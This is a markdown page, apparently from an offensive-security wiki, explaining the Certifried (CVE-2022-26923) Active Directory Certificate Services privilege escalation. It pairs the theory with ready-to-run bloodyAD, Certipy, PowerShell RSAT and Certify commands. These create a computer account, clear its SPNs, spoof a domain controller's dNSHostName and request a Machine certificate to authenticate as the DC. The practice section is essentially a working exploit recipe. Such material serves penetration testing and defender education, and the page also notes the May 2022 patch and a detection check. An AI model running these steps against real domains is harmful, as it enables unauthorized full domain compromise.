---
title: CVE-2022–26923
authors: CravateRouge, ShutdownRepo, sckdev
category: ad
---

# Certifried

## Theory

[Certifried (CVE-2022-26923)](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) is a vulnerability discovered by [Oliver Lyak](https://twitter.com/ly4k_) on AD CS that lets a domain-joined user escalate its privileges in the domain.

A domain user creating a computer account obtains the `Validated write to DNS host name` and `Validated write to service principal name` permissions (among other rights). Therefore, the user is allowed to change the DNS host name (`dNSHostName`) and SPN (`servicePrincipalName`) attributes of the computer account.

Computer accounts (using the `Machine` template) use the value of the `dNSHostName` property for authentication. Attempting to change the `dNSHostName` to match another computer account raises a constraint error.

In fact, the moment the `dNSHostName` property is edited, the domain controller makes sure to update the existing SPNs of the account so that the "hostname" part of it is updated to the new DNS hostname. If the SPNs already exist for another account in Active Directory, the domain controllers raises the constraint violation.

The trick found by Oliver goes as follows:

1. clear the SPNs (or at least those that reflect the `dNSHostName` value, i.e. the ones with fully-qualified hostnames, e.g. `HOST/SRV01.DOMAIN.LOCAL`)
2. change to `dNSHostName` to a target's DNS hostname (e.g. `DC.DOMAIN.LOCAL`). The constraint violation won't be raised since there won't be any SPN to update
3. request a certificate for the computer account using the `Machine` template. The Certificate Authority will use the `dNSHostName` value for identification and issue a certificate for the Domain Controller.
4. Authenticate as the DC.

A patch was released in may 2022 to address this vulnerability: [more information here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#db1c) and on [#certificate-mapping](certificate-templates.md#certificate-mapping).

## Practice

### Detecting unpatched targets

Requesting a certificate based on the `Machine` (or `User`) template can indicate whether the patch has been applied or not. If the certificate object contains an SID (`objectSid`), then the patch has been applied.

::: tabs

=== UNIX-like

This check can be conducted using [Certipy](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ\&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy\&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb) (Python).

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
```


If Certipy doesn't print `Certificate object SID is [...]` after obtaining the certificate, then the attack can be conducted.

> [!WARNING]
> Oliver [underlined](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#08a1) the fact that to fully mitigate the vulnerability, both the KDC and the CA server must be patched.

=== Windows

_At the time of writing this recipe (June 2022), no Windows alternative has been found._

:::


### Conducting the attack

#### Creating a computer account

The first step of the attack consists in creating a computer account ([machineaccountquota.md](../builtins/machineaccountquota), [#create-a-computer-account](../builtins/machineaccountquota#create-a-computer-account)), or have the write permission to the `dNSHostName` and `servicePrincipalName` attributes of another.

#### `dNSHostName` and `servicePrincipalName` modification

The second step is conducted by removing the SPNs that reflect the `dNSHostName` value, and then modifying the `dNSHostName` to the name of the computer account to impersonate.

::: tabs

=== UNIX-like

The [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) tool can be used on UNIX-like systems to operated these changes.

```bash
# Clearing the SPNs
bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname

# Setting the dNSHostName value to the name of a computer account to impersonate
bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'

# Verifying the dNSHostName value and SPN entries
bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname
```


[Certipy](https://github.com/ly4k/Certipy) tool can also add a machine account and amend the `dNSHostName` property with the following command liner.


```bash
# Adding a computer account and setting the dNSHostName to impersonate
certipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN"

```

> [!TIP]
> The Domain Components (DC) are the different parts of the domain name (`DC=domain,DC=local` for `domain.local`, or `DC=sub,DC=domain,DC=local` for `sub.domain.local`).

=== Windows

The [Active Directory RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) tools can be used on Windows systems to operate these changes.

```bash
# Clearing the SPNs
Set-ADComputer $COMPUTER_NAME -ServicePrincipalName @{}

# Setting the dNSHostName value to the name of a computer account to impersonate
Set-ADComputer $COMPUTER_NAME -DnsHostName $DC_NAME.$DOMAIN_FQDN

# Verifying the dNSHostName value and SPN entries
Get-ADComputer $COMPUTER_NAME -properties dnshostname,serviceprincipalname
```

:::


#### Obtaining a certificate

The third and last step consists in getting the certificate of the targeted machine account (`$DC_NAME` in the previous command examples).

::: tabs

=== UNIX-like

[Certipy](https://github.com/ly4k/Certipy) (Python) can be used to request the certificate from UNIX-like systems.


```bash
certipy req -u 'compter$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine'

```


The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.

> [!TIP]
> By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.

=== Windows

[Certify](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwiQmZer1fb3AhVBhRoKHSCyAMoQFnoECAcQAQ\&url=https%3A%2F%2Fgithub.com%2FGhostPack%2FCertify\&usg=AOvVaw0HjmYWwbHvGKTA3-f1iPP0) (C#) can be used to request the certificate from Windows systems.

```powershell
Certify.exe request /ca:"domain\ca" /template:"Machine"
```


The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.

:::


## Resources

[https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)

[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)

[https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)

[https://tryhackme.com/room/cve202226923](https://tryhackme.com/room/cve202226923)